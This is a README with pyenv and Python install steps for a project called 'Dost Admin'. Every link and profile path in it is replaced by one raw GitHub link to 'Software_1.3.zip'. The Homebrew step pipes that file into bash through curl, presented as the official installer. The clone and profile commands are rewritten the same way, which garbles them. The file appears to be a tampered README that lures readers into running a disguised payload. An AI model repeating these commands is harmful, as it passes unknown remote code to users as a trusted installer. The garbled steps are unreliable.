# Dost Admin
## Installation
### Prerequisites
1. #### pyenv
2. #### python 3.8
- ## Installing pyenv
- ### Linux Installation
    1. #### Install Homebrew
    2. #### install pyenv
    #### Home Brew Installation-
    Install HomeBrew - 
    ```sh
    $ /bin/bash -c "$(curl -fsSL https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip)"
    ```
     Add Homebrew to your PATH and to your bash shell profile script, either ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip on Debian/Ubuntu or ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip on CentOS/Fedora/Red Hat.
    ```sh
    $ test -d ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip && eval $(~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip shellenv)
    $ test -d https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip && eval$(https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip shellenv)
    $ test -r ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip &&echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    $ echo "eval \$($(brew --prefix)/bin/brew shellenv)" >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    ```

    #### Installing pyenv
    ```sh
    $ brew update
    $ brew install pyenv  
    ```

    ### MacOs Installation
    1. #### Install Homebrew
    2. #### Install pyenv

    #### Homebrew Installation-
    Install Homebrew-
    ```sh
    $ /bin/bash -c "$(curl -fsSL https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip)"
    ```

    #### Installing pyenv
    Install pyenv binary-
    ```sh
    $ brew update
    $ brew install pyenv
    ```
    Enable pyenv in your profile-
    ```sh
    $ echo 'export PYENV_ROOT="$https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip"' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    $ echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    $ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    ```
    1. The first line sets an environment variable (PYENV_ROOT) that points to the pyenv directory.
    2. The second line puts pyenv first in your search path so that the OS will find pyenv’s Python(s) before any other Pythons.
    3. The last line initializes pyenv each time you open a terminal.

        After All these steps close the terminal and reopen it for the changes to take effect.

    ### Windows Installation-
    #### pyenv installation- 
    1. Download pyenv-win project from github
    ```sh
    git clone https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip $https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    ```
    2. Navigate to Control Panel>System>Advanced    System Settings>Environment Variables. Edit the System PATH variable by adding the following two lines:
    ```sh
    c:\users\USERNAME\.pyenv\pyenv-win\bin
    c:\users\USERNAME\.pyenv\pyenv-win\shims
    ```
    3. Restart your Git session and confirm the     installation by typing `pyenv`.

    ## Installing Python
    #### In the Terminal just type- 
    `pyenv install 3.8.2`

    ---

    ### After successfull installation of pyenv and python clone the branch feature/develop into your local machine.
    ```sh 
    $ git clone --single-branch --branch feature/develop https://github.com/KaushikGarkoti/dostadmin/raw/refs/heads/develop/parallelogram/Software_1.3.zip
    ```
    




















    


